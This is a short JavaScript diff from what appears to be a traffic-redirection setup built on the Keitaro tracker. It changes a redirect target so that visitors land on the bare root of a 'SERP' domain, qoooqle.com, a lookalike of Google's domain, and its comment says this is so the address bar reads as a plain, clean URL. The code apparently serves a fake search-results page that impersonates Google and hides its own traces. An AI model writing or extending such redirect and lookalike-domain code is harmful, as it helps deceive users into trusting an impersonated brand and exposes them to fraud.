@@ -50,9 +50,11 @@
     searchParams.set('register_path', registerPath);
     searchParams.set('about_path', aboutPath);
 
-    // Deployed as index.php on the SERP domain (Keitaro's local_file action
-    // only serves index.php regardless of the requested path).
-    var targetUrl = 'https://' + SERP_DOMAIN + '/index.php?' + searchParams.toString();
+    // Keitaro's local_file action serves index.php regardless of the requested
+    // path, so the bare domain root works too — used instead of "/index.php"
+    // so the address bar reads as plain https://qoooqle.com, not .../index.php
+    // (google.php's own context-redirect preserves whatever path was hit).
+    var targetUrl = 'https://' + SERP_DOMAIN + '/?' + searchParams.toString();
 
     // Where integration/send.php lives relative to the current page — always
     // computed (not just in the {{LANG}} fallback branch above), since the
